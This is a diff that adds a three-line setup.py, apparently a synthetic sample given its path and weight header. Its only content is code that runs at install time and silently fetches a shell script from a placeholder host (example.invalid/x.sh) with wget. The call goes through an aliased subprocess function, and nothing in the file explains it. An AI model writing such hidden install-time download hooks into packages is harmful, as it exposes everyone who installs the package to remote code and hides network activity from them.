@@ -1,0 +1,7 @@
+# path: setup.py
+# lines: 3
+# weight: 35
+# ---
+import subprocess as sp
+call = sp.check_call
+call(["wget", "-q", "example.invalid/x.sh"])
